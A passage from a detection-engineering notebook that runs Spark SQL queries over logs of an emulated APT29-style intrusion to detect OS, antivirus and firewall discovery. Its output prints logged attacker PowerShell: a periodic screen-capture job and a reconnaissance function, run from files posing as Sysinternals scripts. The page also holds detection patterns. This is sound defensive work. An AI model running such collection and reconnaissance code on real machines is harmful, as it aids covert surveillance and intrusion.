----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-ScreenCapture
# https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/
{
    Start-Job -Name &quot;Screenshot&quot; -ScriptBlock { 
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        while($true){
            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
            $Filepath=&quot;$env:USERPROFILE\Downloads\$RandomFileName.bmp&quot;; 
            Add-Type -AssemblyName System.Windows.Forms; 
            Add-type -AssemblyName System.Drawing; 
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
            $Width = $Screen.Width; 
            $Height = $Screen.Height; 
            $Left = $Screen.Left; 
            $Top = $Screen.Top; 
            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; 
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap); 
            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); 
            $bitmap.Save($Filepath); 
            Start-Sleep -Seconds 300
        } 
    }
}

ScriptBlock ID: b91c2ae7-3a03-49df-8d2a-4c42fc79df56
Path: C:\Program Files\SysinternalsSuite\psversion.ps1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-6-system-information-discovery">
<h2>4.C.6. System Information Discovery<a class="headerlink" href="#c-6-system-information-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated the OS version using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing​ Gwmi Win32_OperatingSystem</p>
<div class="section" id="id31">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id31" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:5A2B7006-A887-465F-9D41-AED8F6AECBE1</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%gwmi win32_operatingsystem%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:69A3B3AC-42BE-44F6-A418-C2356894F745</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%gwmi win32_operatingsystem%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-7-security-software-discovery">
<h2>4.C.7. Security Software Discovery<a class="headerlink" href="#c-7-security-software-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated anti-virus software using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing​ Get-WmiObject …​ -Class AntiVirusProduct</p>
<div class="section" id="id32">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id32" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:E1E0849D-1771-438B-9D8F-A67B7EC48B97</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%-class antivirusproduct%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:956D78C8-FCB5-440D-B059-6790F729D02D</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%-class antivirusproduct%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-8-security-software-discovery">
<h2>4.C.8. Security Software Discovery<a class="headerlink" href="#c-8-security-software-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated firewall software using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Get-WmiObject …​​ -Class FireWallProduct</p>
<div class="section" id="id33">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id33" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:9F924458-73AD-42C8-B98E-0CB4B4355B9B</strong></p>
<div class="cell docutils container">
